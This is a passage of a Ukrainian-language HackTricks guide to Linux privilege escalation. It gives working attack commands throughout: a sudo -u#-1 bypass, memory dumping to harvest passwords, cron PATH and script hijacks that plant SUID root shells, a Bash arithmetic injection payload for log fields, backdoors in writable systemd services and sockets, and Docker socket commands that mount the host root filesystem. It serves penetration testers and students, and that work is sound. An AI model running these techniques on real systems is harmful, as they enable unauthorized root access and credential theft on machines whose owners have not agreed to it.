# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Інформація про систему

### Інформація про ОС

Почнемо збирати відомості про запущену ОС
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Якщо ви **маєте права запису в будь-якій папці всередині змінної `PATH`**, ви зможете hijack деякі libraries або binaries:
```bash
echo $PATH
```
### Інформація про env

Чи містять змінні середовища цікаву інформацію, паролі або API-ключі?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Перевірте версію kernel і чи існує exploit, який можна використати для escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Тут ви можете знайти хороший список вразливих версій ядра та деякі вже **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) та [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Інші сайти, де ви можете знайти деякі **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб витягти всі вразливі версії ядра з того веб-сайту, ви можете зробити так:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти шукати kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустіть IN victim, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію kernel у Google**, можливо ваша версія kernel зазначена в якомусь kernel exploit — тоді ви будете впевнені, що цей exploit дійсний.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo версія

На основі вразливих версій sudo, що вказані в:
```bash
searchsploit sudo
```
Ви можете перевірити, чи версія sudo вразлива, використовуючи цей grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Перевірте **smasher2 box of HTB** як **приклад** того, як цю vuln можна експлуатувати.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Детальніша системна енумерація
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелічити можливі засоби захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Якщо ви перебуваєте всередині docker container, ви можете спробувати вирватися з нього:

{{#ref}}
docker-security/
{{#endref}}

## Диски

Перевірте **що змонтовано і що розмонтовано**, де і чому. Якщо щось розмонтовано, ви можете спробувати змонтувати це й перевірити на наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічення корисних бінарних файлів
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи **встановлено будь-який компілятор**. Це корисно, якщо вам потрібно використовувати якийсь kernel exploit, оскільки рекомендується скомпілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Уразливе встановлене програмне забезпечення

Перевірте **версію встановлених пакетів та сервісів**. Можливо, є якась стара версія Nagios (наприклад), яку можна експлуатувати для escalating privileges…\
Рекомендується вручну перевірити версію більш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є SSH-доступ до машини, ви також можете використати **openVAS** для перевірки застарілого та вразливого програмного забезпечення, встановленого на машині.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка в більшості буде непотрібною, тому рекомендується використовувати програми, такі як OpenVAS або подібні, які перевіряють, чи яка-небудь встановлена версія програмного забезпечення є вразливою до відомих exploits_

## Processes

Погляньте, **які процеси** виконуються та перевірте, чи якийсь процес має **більше привілеїв, ніж повинен** (можливо, tomcat запущено під root?)
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers** — you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Also **check your privileges over the processes binaries**, можливо, ви зможете перезаписати чийсь файл.

### Моніторинг процесів

Ви можете використовувати інструменти, такі як [**pspy**](https://github.com/DominicBreuker/pspy), для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, що виконуються часто або коли виконуються певні умови.

### Пам'ять процесу

Деякі сервіси на сервері зберігають **облікові дані у відкритому вигляді в пам'яті**.\
Зазвичай вам знадобляться **root privileges** для читання пам'яті процесів, що належать іншим користувачам, тому це зазвичай корисніше, коли ви вже root і хочете знайти більше облікових даних.\
Однак пам'ятайте, що **як звичайний користувач ви можете читати пам'ять процесів, що належать вам**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: всі процеси можна відлагодити, якщо вони мають той самий uid. Це класичний спосіб роботи ptrace.
> - **kernel.yama.ptrace_scope = 1**: відлагоджуватись може тільки батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: Жодні процеси не можуть бути трасовані через ptrace. Після встановлення потрібне перезавантаження, щоб знову дозволити ptrace.

#### GDB

Якщо у вас є доступ до пам'яті сервісу FTP (наприклад), ви можете отримати Heap і шукати в ньому облікові дані.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB скрипт
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ідентифікатора процесу (PID) **maps показують, як пам'ять відображається у віртуальному адресному просторі цього процесу**; також вони показують **права доступу кожного відображеного регіону**. Псевдо-файл **mem** **надає доступ до самої пам'яті процесу**. Із файлу **maps** ми дізнаємося, які **регіони пам'яті доступні для читання** та їхні офсети. Ми використовуємо цю інформацію, щоб **seek у файл mem і dump усі доступні для читання регіони** в окремий файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до системної **фізичної** пам'яті, а не до віртуальної пам'яті. Віртуальний адресний простір ядра можна отримати через /dev/kmem.\  
Зазвичай `/dev/mem` доступний для читання лише користувачу **root** та групі **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump — це переосмислення для Linux класичного інструмента ProcDump із набору Sysinternals для Windows. Отримати його можна за [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб dump process memory ви можете використовувати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимоги root і dump процес, що належить вам
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з process memory

#### Ручний приклад

Якщо ви виявите, що процес authenticator запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете dump the process (див. попередні розділи, щоб знайти різні способи dump пам'яті процесу) і шукати credentials всередині пам'яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) викрадає облікові дані у відкритому тексті з пам'яті та з деяких відомих файлів. Для коректної роботи вимагає привілеїв root.

| Функція                                           | Ім'я процесу         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Пошукові регулярні вирази/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron завдання

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Якщо веб-панель “Crontab UI” (alseambusher/crontab-ui) працює від root і прив'язана лише до loopback, її все одно можна дістати через SSH local port-forwarding і створити привілейоване завдання для підвищення привілеїв.

Типова послідовність
- Виявити порт, доступний лише з loopback (наприклад, 127.0.0.1:8000) та Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
  - Резервні копії/скрипти з `zip -P <password>`
  - systemd unit, що містить `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Тунелювання та вхід:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створити high-priv job і запустити негайно (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використовуйте це:
```bash
/tmp/rootshell -p   # root shell
```
Зміцнення безпеки
- Не запускайте Crontab UI від імені root; обмежте запуск виділеним користувачем і мінімальними дозволами
- Прив’язуйте до localhost і додатково обмежуйте доступ через firewall/VPN; не використовуйте повторно passwords
- Уникайте вбудовування секретів у unit files; використовуйте secret stores або root-only EnvironmentFile
- Увімкніть аудит/логування для виконання задач за вимогою

Перевірте, чи якась запланована задача вразлива. Можливо, ви зможете скористатися скриптом, який виконується від імені root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron шлях

Наприклад, всередині _/etc/crontab_ ви можете знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо всередині цього crontab користувач root намагається виконати команду або скрипт, не встановивши PATH. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати root shell, використавши:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, який використовує скрипт з wildcard (Wildcard Injection)

Якщо скрипт виконується від root і має “**\***” всередині команди, ви можете це експлуатувати для виконання небажаних дій (наприклад privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо wildcard передує шляху на кшталт** _**/some/path/\***_ **, він не вразливий (навіть** _**./\***_ **не є вразливим).**

Прочитайте наступну сторінку, щоб дізнатися більше трюків експлуатації wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash виконує розширення параметрів/змінних та підстановку команд перед арифметичною оцінкою в ((...)), $((...)) та let. Якщо root cron/parser читає неперевірені поля логів і підставляє їх в арифметичний контекст, атакуючий може інʼєктувати підстановку команд $(...), яка виконається від імені root при запуску cron.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Типовий вразливий шаблон:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: добийтеся того, щоб у парсований лог записався текст, контрольований атакуючим, так щоб поле, що виглядає як число, містило підстановку команд і закінчувалося цифрою. Переконайтеся, що ваша команда не пише в stdout (або перенаправте її), щоб арифметичний вираз залишався валідним.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо script, що виконується від імені root, використовує **directory, до якого у вас є повний доступ**, можливо, варто видалити цю папку і **створити symlink-папку, що вказує на іншу**, яка слугуватиме для запуску script під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Часті cron jobs

Ви можете моніторити процеси, щоб шукати ті, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і escalate privileges.

Наприклад, щоб **моніторити кожні 0.1s протягом 1 хвилини**, **сортувати за найменш виконуваними командами** і видалити команди, які були виконані найбільше, ви можете зробити:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ви також можете використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (воно відстежуватиме та перераховуватиме кожен процес, що запускається).

### Невидимі cron jobs

Можна створити cronjob, **додавши символ повернення каретки після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Служби

### Записувані _.service_ файли

Перевірте, чи можете ви записати будь-який `.service` файл, якщо так, ви **можете змінити його** так, щоб він **виконував** ваш **backdoor коли** служба **запускається**, **перезапускається** або **зупиняється** (можливо, вам доведеться почекати, поки машина не буде перезавантажена).\
Наприклад, створіть ваш backdoor всередині .service файлу з **`ExecStart=/tmp/script.sh`**

### Записувані бінарні файли сервісів

Майте на увазі, що якщо у вас є **права на запис у бінарні файли, які виконуються службами**, ви можете змінити їх на backdoors, тож коли служби будуть повторно виконані, backdoors будуть виконані.

### systemd PATH - Відносні шляхи

Ви можете побачити PATH, який використовується **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** в будь-яку з папок цього шляху, ви можете мати змогу **підвищити привілеї**. Вам потрібно шукати **відносні шляхи, що використовуються в конфігураційних файлах сервісів**, такі як:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **executable** з тією ж назвою, що й бінарник за відносним шляхом, у каталозі systemd PATH, у який ви маєте право запису, і коли службі буде наказано виконати вразливу дію (**Start**, **Stop**, **Reload**), ваш **backdoor** буде виконано (звичайно невповноважені користувачі не можуть запускати/зупиняти служби, але перевірте, чи можете використати `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це systemd unit файли, назва яких закінчується в `**.timer**`, що контролюють `**.service**` файли або події. **Таймери** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку подій за календарним часом і монотонних таймерів та можуть виконуватися асинхронно.

Ви можете перерахувати всі таймери за допомогою:
```bash
systemctl list-timers --all
```
### Таймери, доступні для запису

Якщо ви можете змінити таймер, ви можете змусити його виконати деякі існуючі systemd.unit (наприклад `.service` або `.target`)
```bash
Unit=backdoor.service
```
У документації ви можете прочитати, що таке Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Отже, щоб зловживати цим дозволом, вам потрібно:

- Знайти якийсь systemd unit (наприклад `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти якийсь systemd unit, який **виконує відносний шлях** і у вас є **права запису** над **systemd PATH** (щоб підмінити цей виконуваний файл)

**Детальніше про timers див. у `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути timer потрібні права root і виконати:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) дозволяють **взаємодію процесів** на тій самій або різних машинах у моделях клієнт‑сервер. Вони використовують стандартні Unix descriptor файли для міжмашинної комунікації і налаштовуються через `.socket` файли.

Sockets можна налаштовувати за допомогою `.socket` файлів.

**Дізнайтеся більше про sockets за допомогою `man systemd.socket`.** Всередині цього файлу можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці опції різняться між собою, але в загальному служать для **вказування, де буде відбуватися прослуховування** сокета (шлях до AF_UNIX socket файлу, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: Приймає булевий аргумент. Якщо **true**, то **для кожного вхідного з’єднання створюється інстанс service** і йому передається лише сокет з’єднання. Якщо **false**, усі прослуховуючі сокети **передаються відразу до стартованого service unit**, і створюється лише один service unit для всіх з’єднань. Це значення ігнорується для datagram sockets і FIFOs, де один service unit безумовно обробляє весь вхідний трафік. **Defaults to false**. З міркувань продуктивності рекомендується писати нові демони таким чином, щоб вони підходили для `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають одну або декілька рядків команд, які **виконуються до** або **після** створення та прив’язки прослуховуючих **sockets**/FIFOs відповідно. Першим токеном командного рядка має бути абсолютне ім’я файлу, за яким слідують аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються до** або **після** закриття та видалення прослуховуючих **sockets**/FIFOs відповідно.
- `Service`: Вказує ім’я **service** unit, яке потрібно **активувати** при **вхідному трафіку**. Ця опція дозволена лише для сокетів з Accept=no. За замовчуванням використовується service з таким же ім’ям, як і socket (з відповідною заміною суфікса). У більшості випадків використання цієї опції не є необхідним.

### Writable .socket files

Якщо ви знайдете **доступний для запису** `.socket` файл, ви можете **додати** на початку секції `[Socket]` щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor` і backdoor буде виконано перед створенням сокета. Тому, **ймовірно доведеться дочекатися перезавантаження машини.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Якщо ви **виявите будь‑який доступний для запису socket** (_тут мова про Unix Sockets, а не про конфігураційні `.socket` файли_), то **ви зможете спілкуватися** з цим socket і, можливо, експлуатувати вразливість.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Необроблене з'єднання
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Зверніть увагу, що можуть бути деякі **sockets listening for HTTP** requests (_я не маю на увазі .socket files, а файли, що виступають як unix sockets_). Перевірити це можна за допомогою:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Якщо socket **responds with an HTTP** request, то ви можете **communicate** з ним і, можливо, **exploit some vulnerability**.

### Доступний для запису Docker Socket

Docker socket, часто знаходиться за `/var/run/docker.sock`, є критично важливим файлом, який слід захистити. За замовчуванням він доступний для запису користувачу `root` та членам групи `docker`. Наявність прав запису до цього socket може призвести до privilege escalation. Нижче наведено розбір того, як це можна зробити, та альтернативні методи, якщо Docker CLI недоступний.

#### **Privilege Escalation with Docker CLI**

Якщо у вас є write access до Docker socket, ви можете escalate privileges, використовуючи наступні команди:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ці команди дозволяють запустити контейнер із доступом на рівні root до файлової системи хоста.

#### **Використання Docker API безпосередньо**

У випадках, коли Docker CLI недоступний, Docker socket все ще можна маніпулювати за допомогою Docker API та команд `curl`.

1.  **List Docker Images:** Отримати список доступних образів.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Надіслати запит на створення контейнера, який монтує кореневий каталог хост-системи.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Запустіть щойно створений контейнер:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Використайте `socat`, щоб встановити з'єднання з контейнером, що дозволить виконувати команди всередині нього.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Після встановлення `socat`-з'єднання ви можете виконувати команди безпосередньо в контейнері з доступом root до файлової системи хоста.

### Інше

Зауважте, що якщо у вас є права запису до docker socket, оскільки ви **є членом групи `docker`**, у вас є [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Якщо [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **more ways to break out from docker or abuse it to escalate privileges** в:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Якщо ви можете використовувати команду **`ctr`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Якщо ви можете використовувати команду **`runc`**, прочитайте наступну сторінку, оскільки **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна Inter-Process Communication (IPC) система, яка дозволяє застосункам ефективно взаємодіяти та обмінюватися даними. Розроблена для сучасної системи Linux, вона надає надійну основу для різних форм комунікації між застосунками.

Система багатофункціональна: підтримує базовий IPC, який покращує обмін даними між процесами, нагадуючи розширені UNIX domain sockets. Крім того, вона допомагає транслювати події або сигнали, сприяючи безшовній інтеграції компонентів системи. Наприклад, сигнал від Bluetooth-демона про вхідний дзвінок може змусити медіаплеєр приглушити звук, покращуючи користувацький досвід. Також D-Bus підтримує remote object system, що спрощує запити сервісів та виклики методів між застосунками, оптимізуючи процеси, які раніше були складними.

D-Bus працює за моделлю allow/deny, керуючи дозволами на повідомлення (виклики методів, відправлення сигналів тощо) на основі кумулятивного ефекту співпадних правил політики. Ці політики визначають взаємодії з шиною, потенційно дозволяючи privilege escalation шляхом експлуатації цих дозволів.

Наведено приклад такої політики у `/etc/dbus-1/system.d/wpa_supplicant.conf`, що деталізує дозволи для користувача root на володіння, відправлення та отримання повідомлень від fi.w1.wpa_supplicant1.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не покритий іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся, як enumerate та exploit D-Bus комунікацію тут:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво enumerate мережу та визначити розташування машини в ній.

### Загальна enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не мали змоги взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо так, ви зможете отримати деякі облікові дані.
```
timeout 1 tcpdump
```
## Користувачі

### Загальна перевірка

Перевірте, **хто** ви, які **privileges** у вас є, які **users** є в системі, хто може **login** та хто має **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

